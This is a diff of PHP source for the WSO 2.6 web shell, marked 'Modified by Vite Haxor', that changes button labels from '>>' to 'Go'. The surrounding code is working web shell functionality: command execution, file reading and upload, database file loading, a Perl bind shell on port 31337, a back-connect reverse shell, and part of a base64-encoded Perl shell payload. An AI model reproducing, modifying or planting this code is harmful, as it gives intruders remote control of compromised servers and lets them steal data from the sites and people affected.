@@ -309,28 +309,28 @@ function wsoFooter() {
 	<tr>
 		<td><form onsubmit='g(null,this.c.value,\"\");return false;'><span>Change dir:</span><br><input class='toolsInp' type=text name=c 
 
-value='" . htmlspecialchars($GLOBALS['cwd']) ."'><input type=submit value='>>'></form></td>
+value='" . htmlspecialchars($GLOBALS['cwd']) ."'><input type=submit value='Go'></form></td>
 		<td><form onsubmit=\"g('FilesTools',null,this.f.value);return false;\"><span>Read file:</span><br><input class='toolsInp' type=text 
 
-name=f><input type=submit value='>>'></form></td>
+name=f><input type=submit value='Go'></form></td>
 	</tr><tr>
 		<td><form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);return false;\"><span>Make dir:</span>$is_writable<br><input 
 
-class='toolsInp' type=text name=d><input type=submit value='>>'></form></td>
+class='toolsInp' type=text name=d><input type=submit value='Go'></form></td>
 		<td><form onsubmit=\"g('FilesTools',null,this.f.value,'mkfile');return false;\"><span>Make file:</span>$is_writable<br><input 
 
-class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>
+class='toolsInp' type=text name=f><input type=submit value='Go'></form></td>
 
 	</tr><tr>
 		<td><form onsubmit=\"g('Console',null,this.c.value);return false;\"><span>Execute:</span><br><input class='toolsInp' type=text name=c 
 
-value=''><input type=submit value='>>'></form></td>
+value=''><input type=submit value='Go'></form></td>
 		<td><form method='post' ENCTYPE='multipart/form-data'>
 		<input type=hidden name=a value='FilesMAn'>
 		<input type=hidden name=c value='" . $GLOBALS['cwd'] ."'>
 		<input type=hidden name=p1 value='uploadFile'>
 		<input type=hidden name=charset value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
-		<span>Upload file:</span>$is_writable<br><input class='toolsInp' type=file name=f><input type=submit value='>>'></form><br  ></td>
+		<span>Upload file:</span>$is_writable<br><input class='toolsInp' type=file name=f><input type=submit value='Go'></form><br  ></td>
 
 	</tr></table><center>WSO 2.6 - Modified by Vite Haxor</center></div></font></body></html>";
 }
@@ -1991,7 +1991,7 @@ echo ">PostgreSql</option></select></td>
 		echo $tmp;
 	echo "</td>
 
-				<td><input type=submit value='>>' onclick='fs(d.sf);'></td>
+				<td><input type=submit value='Go' onclick='fs(d.sf);'></td>
                 <td><input type=checkbox name=sql_count value='on'" . (empty($_POST['sql_count'])?'':' checked') . "> count the number of rows</td>
 			</tr>
 		</table>
@@ -2103,7 +2103,7 @@ false;'><textarea name='query' style='width:100%;height:100px'>";
                 if($db->fetch())
                     echo "<form onsubmit='d.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input 
 
- class='toolsInp' type=text name=f><input type=submit value='>>'></form>";
+ class='toolsInp' type=text name=f><input type=submit value='Go'></form>";
             }
 			if(@$_POST['p1'] == 'loadfile') {
 				$file = $db->loadFile($_POST['p2']);
@@ -2149,13 +2149,13 @@ iAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0="
 
 	<form name='nfp' onSubmit=\"g(null,null,'bpp',this.port.value);return false;\">
 	<span>Bind port to /bin/sh [perl]</span><br/>
-	Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>
+	Port: <input type='text' name='port' value='31337'> <input type=submit value='Go'>
 	</form>
 	<form name='nfp' onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\">
 	<span>Back-connect  [perl]</span><br/>
 	Server: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'> Port: <input type='text' name='port' value='31337'> <input 
 
-type=submit value='>>'>
+type=submit value='Go'>
 
 	</form><br>";
 	if(isset($_POST['p1'])) {
